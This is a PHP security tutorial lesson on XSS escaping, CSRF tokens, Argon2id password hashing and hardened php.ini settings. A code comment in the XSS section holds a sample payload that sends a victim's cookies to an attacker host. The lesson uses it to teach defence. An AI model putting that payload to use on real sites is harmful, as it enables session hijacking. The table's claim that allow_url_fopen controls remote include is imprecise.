## Lesson 2: PHP Security

Writing production-grade PHP applications requires adopting a defensive security posture. Because PHP handles web traffic directly, it is a primary target for malicious actors. This lesson covers the core security vulnerabilities defined by OWASP and how to mitigate them natively in PHP.

---

## 1. Cross-Site Scripting (XSS) Mitigation

XSS occurs when an application takes untrusted data from an HTTP request or database and sends it directly to a web browser without proper validation or escaping. This allows attackers to execute malicious JavaScript in the victim's browser to steal session cookies or hijack accounts.

### The Vulnerable Code

```php
// If $_GET['search'] contains <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
// The browser will execute it immediately.
echo "<div>You searched for: " . $_GET['search'] . "</div>";

```

### The Production Shield: Contextual Escaping

Always escape dynamic output at the exact moment it is rendered into HTML. Use `htmlspecialchars()` with explicit flags.

```php
$safeSearch = htmlspecialchars($_GET['search'] ?? '', ENT_QUOTES, 'UTF-8');
echo "<div>You searched for: " . $safeSearch . "</div>";

```

* **`ENT_QUOTES`**: Escapes both single (`'`) and double (`"`) quotes, preventing attackers from breaking out of HTML attributes.
* **`UTF-8`**: Ensures the character encoding is explicitly handled, closing encoding-based bypass vectors.

---

## 2. Cross-Site Request Forgery (CSRF) Defense

CSRF is an attack that forces an authenticated user to execute unwanted actions on a web application in which they are currently authenticated. The attacker tricks the user's browser into sending a state-changing HTTP request (like a password reset or funds transfer) back to your server along with the user's valid session cookie.

### The Production Shield: Anti-CSRF Cryptographic Tokens

To prevent CSRF, generate a unique, unpredictable token for each user session. Embed this token inside your HTML forms. When the form is submitted, verify that the submitted token matches the token stored in the server-side session.

### Step 1: Generating and Embedding the Token

```php
<?php
session_start();
if (empty($_SESSION['csrf_token'])) {
    // Generate a secure, pseudo-random token string
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
?>
<form action="update_email.php" method="POST">
    <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">
    <label for="email">New Email:</label>
    <input type="email" id="email" name="email" required>
    <button type="submit">Update</button>
</form>

```

### Step 2: Validating the Token on Submission (`update_email.php`)

```php
<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $submittedToken = $_POST['csrf_token'] ?? '';
    
    // Use hash_equals to protect against timing attacks
    if (!hash_equals($_SESSION['csrf_token'] ?? '', $submittedToken)) {
        header('HTTP/1.1 403 Forbidden');
        exit('CSRF token validation failed.');
    }
    
    // Process the form safely...
}

```

---

## 3. Cryptographic Password Hashing

Never store plain-text passwords or weak cryptographic hashes (like MD5 or SHA1) in your database. Attackers can quickly crack these using precomputed rainbow tables or brute-force hardware.

### Production Rule: Native Password Hashing API

PHP provides a robust, native API (`password_hash()` and `password_verify()`) that automatically manages salt generation and utilizes industry-standard, slow hashing algorithms (like Argon2id and bcrypt).

```php
<?php
declare(strict_types=1);

$password = "user_secret_password_123";

// 1. Hash the password securely using the standard Argon2id algorithm
$hashedPassword = password_hash($password, PASSWORD_ARGON2ID);
// The resulting string includes the algorithm identifier, cost factors, salt, and hash value.

// 2. Verify an incoming plain-text password against the stored hash value
$userLoginInput = "user_secret_password_123";

if (password_verify($userLoginInput, $hashedPassword)) {
    echo "Authentication successful.";
} else {
    echo "Invalid credentials provided.";
}

```

---

## 4. Secure PHP Environment Configurations

Production security relies heavily on locking down runtime environment values inside your initialization files (`php.ini`).

### Critical Production Settings Matrix

| `php.ini` Directive | Target Value | Security Rationale |
| --- | --- | --- |
| **`display_errors`** | `Off` | Prevents internal database details, table names, and stack traces from displaying to the end-user during a failure. |
| **`log_errors`** | `On` | Routes all script exceptions and engine errors to a private server log file for administrative tracking. |
| **`expose_php`** | `Off` | Removes the `X-Powered-By: PHP/x.x.x` header from HTTP responses, blinding attackers to the exact language version running. |
| **`allow_url_fopen`** | `Off` | Disables treating remote URLs as local files inside functions like `include` or `file_get_contents`, mitigating Remote File Inclusion (RFI) vectors. |
| **`session.cookie_httponly`** | `1` | Enforces that all session tracking cookies are completely hidden from client-side JavaScript execution engines. |